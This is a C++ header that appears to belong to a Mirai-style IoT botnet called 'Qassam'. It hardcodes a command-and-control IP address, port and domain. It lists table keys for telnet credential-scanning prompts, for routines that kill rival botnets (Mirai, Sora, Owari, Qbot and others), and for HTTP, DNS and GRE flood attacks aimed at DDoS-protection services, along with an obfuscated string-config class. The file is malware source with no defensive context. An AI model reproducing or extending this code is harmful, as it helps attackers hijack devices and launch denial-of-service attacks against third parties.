#pragma once

#ifndef F3A1C3AD_8EEA_4092_8ACA_CEB3B3C273FB
#define F3A1C3AD_8EEA_4092_8ACA_CEB3B3C273FB


#include <unistd.h>
#include <cstdint>
#include <cstdarg>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <cstring>
#include <cstdlib>
#include <array>
#include <variant>



using ipv4_t = std::uint32_t;
using ipv6_t = std::array<std::uint8_t, 16>;
using port_t = std::uint16_t;
using ip_addr_t = std::variant<ipv4_t, ipv6_t>;



[[nodiscard]]
constexpr ipv4_t QASSAM_INET_ADDR_IPV4(std::uint8_t o1, std::uint8_t o2, std::uint8_t o3, std::uint8_t o4) noexcept;
[[nodiscard]]
constexpr ipv6_t QASSAM_INET_ADDR_IPV6(std::uint8_t a1, std::uint8_t a2, std::uint8_t a3, std::uint8_t a4,std::uint8_t b1, std::uint8_t b2, std::uint8_t b3, std::uint8_t b4,std::uint8_t c1, std::uint8_t c2, std::uint8_t c3, std::uint8_t c4,std::uint8_t d1, std::uint8_t d2, std::uint8_t d3, std::uint8_t d4) noexcept;


inline constexpr int QASSAM_STDIN_FD = STDIN_FILENO;
inline constexpr int QASSAM_STDOUT_FD = STDOUT_FILENO;
inline constexpr int QASSAM_STDERR_FD = STDERR_FILENO;

inline constexpr ipv4_t QASSAM_FAKE_CNC_ADDR = QASSAM_INET_ADDR_IPV4(46, 17, 42, 41);
inline constexpr port_t QASSAM_FAKE_CNC_PORT = 23;


#ifndef USEDOMAIN
    inline constexpr ipv4_t QASSAM_SCANIP = static_cast<ipv4_t>(inet_addr("0.0.0.0"));
    inline constexpr ipv4_t QASSAM_SERVIP = static_cast<ipv4_t>(inet_addr("0.0.0.0"));
#else
    inline constexpr const char* QASSAM_SCANDOM = "indiatechsupport.club";
    inline constexpr const char* QASSAM_SERVDOM = "indiatechsupport.club";
    inline constexpr ipv4_t QASSAM_SCANIP = static_cast<ipv4_t>(inet_addr("0.0.0.0"));
    inline constexpr ipv4_t QASSAM_SERVIP = static_cast<ipv4_t>(inet_addr("0.0.0.0"));
#endif

extern ipv4_t LOCAL_ADDR;


inline constexpr std::uint16_t QASSAM_PROTO_DNS_QTYPE_A = 1;
inline constexpr std::uint16_t QASSAM_PROTO_DNS_QCLASS_IP = 1;
inline constexpr std::uint8_t QASSAM_PROTO_TCP_OPT_NOP = 1;
inline constexpr std::uint8_t QASSAM_PROTO_TCP_OPT_MSS = 2;
inline constexpr std::uint8_t QASSAM_PROTO_TCP_OPT_WSS = 3;
inline constexpr std::uint8_t QASSAM_PROTO_TCP_OPT_SACK = 4;
inline constexpr std::uint8_t QASSAM_PROTO_TCP_OPT_TSVAL = 8;
inline constexpr std::uint16_t QASSAM_PROTO_GRE_TRANS_ETH = 0x6558;

inline constexpr std::int32_t QASSAM_TABLE_CNC_PORT = 1;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_CB_PORT = 2;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_SUCCESS = 3;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_SHELL = 4;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_ENABLE = 5;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_SYSTEM = 6;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_SH = 7;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_QUERY = 8;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_RESP = 9;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_NCORRECT= 10;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_PS = 11;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_KILL_9 = 12;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_PROC = 13;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_EXE = 14;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_FD = 15;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_MAPS = 16;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_TCP = 17;
inline constexpr std::int32_t QASSAM_TABLE_MEM_ROUTE = 18;
inline constexpr std::int32_t QASSAM_TABLE_MEM_ASSWD = 19;
inline constexpr std::int32_t QASSAM_TABLE_ATK_VSE = 20;
inline constexpr std::int32_t QASSAM_TABLE_ATK_RESOLVER = 21;
inline constexpr std::int32_t QASSAM_TABLE_ATK_NSERV = 22;
inline constexpr std::int32_t QASSAM_TABLE_MISC_WATCHDOG = 23;
inline constexpr std::int32_t QASSAM_TABLE_MISC_WATCHDOG2 = 24;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_ASSWORD = 25;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_OGIN = 26;
inline constexpr std::int32_t QASSAM_TABLE_SCAN_ENTER = 27;
inline constexpr std::int32_t QASSAM_TABLE_MISC_RAND = 28;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_STATUS = 29;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_ANIME = 30;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_MIRAI = 32;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_SORA1 = 33;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_SORA2 = 34;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_SORA3 = 35;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_OWARI = 36;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_OWARI2 = 37;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_JOSHO = 38;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_APOLLO = 39;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_STATUS = 40;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_ANIME = 41;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_ROUTE = 42;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_CPUINFO = 43;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_BOGO = 44;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_RC = 45;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_MASUTA1 = 46;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_MIRAI1 = 47;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_MIRAI2 = 48;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_VAMP1 = 49;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_VAMP3 = 50;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_IRC1 = 51;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_QBOT1 = 52;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_QBOT2 = 53;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_IRC2 = 54;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_MIRAI3 = 55;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_EXE = 56;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_OMNI = 57;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_LOL = 58;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_SHINTO3 = 59;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_SHINTO5 = 60;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_JOSHO5 = 61;
inline constexpr std::int32_t QASSAM_TABLE_EXEC_JOSHO4 = 62;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_UPX = 63;

inline constexpr std::int32_t QASSAM_TABLE_KILLER_REP1 = 64;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_REP2 = 65;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_REP3 = 66;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_REP4 = 67;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_REP5 = 68;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_REP6 = 69;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_REP7 = 70;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_REP8 = 71;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_REP9 = 72;
inline constexpr std::int32_t QASSAM_TABLE_KILLER_REP10 = 73;

inline constexpr std::int32_t QASSAM_TABLE_ATK_KEEP_ALIVE = 74;
inline constexpr std::int32_t QASSAM_TABLE_ATK_ACCEPT = 75;
inline constexpr std::int32_t QASSAM_TABLE_ATK_ACCEPT_LNG = 76;
inline constexpr std::int32_t QASSAM_TABLE_ATK_CONTENT_TYPE = 77;
inline constexpr std::int32_t QASSAM_TABLE_ATK_SET_COOKIE = 78;
inline constexpr std::int32_t QASSAM_TABLE_ATK_REFRESH_HDR = 79;
inline constexpr std::int32_t QASSAM_TABLE_ATK_LOCATION_HDR = 80;
inline constexpr std::int32_t QASSAM_TABLE_ATK_SET_COOKIE_HDR = 81;
inline constexpr std::int32_t QASSAM_TABLE_ATK_CONTENT_LENGTH_HDR = 82;
inline constexpr std::int32_t QASSAM_TABLE_ATK_TRANSFER_ENCODING_HDR = 83;
inline constexpr std::int32_t QASSAM_TABLE_ATK_CHUNKED = 84;
inline constexpr std::int32_t QASSAM_TABLE_ATK_KEEP_ALIVE_HDR = 85;
inline constexpr std::int32_t QASSAM_TABLE_ATK_CONNECTION_HDR = 86;
inline constexpr std::int32_t QASSAM_TABLE_ATK_DOSARREST = 87;
inline constexpr std::int32_t QASSAM_TABLE_ATK_CLOUDFLARE_NGINX = 88;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_1 = 89;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_2 = 90;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_3 = 91;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_4 = 92;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_5 = 93;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_6 = 94;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_7 = 95;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_8 = 96;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_9 = 97;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_10 = 98;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_11 = 99;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_12 = 100;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_13 = 101;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_14 = 102;
inline constexpr std::int32_t QASSAM_TABLE_HTTP_15 = 103;

inline constexpr std::int32_t QASSAM_TABLE_MAX_KEYS = 31;


struct QassamDnsHeader {
    std::uint16_t id{};
    std::uint16_t opts{};
    std::uint16_t qdcount{};
    std::uint16_t ancount{};
    std::uint16_t nscount{};
    std::uint16_t arcount{};
};


struct QassamDnsQuestion {
    std::uint16_t qtype{};
    std::uint16_t qclass{};
};


struct QassamDnsResource {
    std::uint16_t type{};
    std::uint16_t _class{};
    std::uint32_t ttl{};
    std::uint16_t data_len{};
}__attribute__((packed));



struct QassamGreHeader {
    std::uint16_t opts{};
    std::uint16_t protocol{};
};



class QassamConfig
{
    public:

        void qassam_table_init() noexcept;
        void qassam_table_unlock_val(std::uint8_t) noexcept;
        void qassam_table_lock_val(std::uint8_t) noexcept;

        [[nodiscard]]
        char* qassam_table_retrieve_val(int, int*) noexcept;

        static void qassam_add_entry(std::uint8_t, const char*, int) noexcept;
        static void qassam_toggle_obf(std::uint8_t) noexcept;
};



















#endif /* F3A1C3AD_8EEA_4092_8ACA_CEB3B3C273FB */





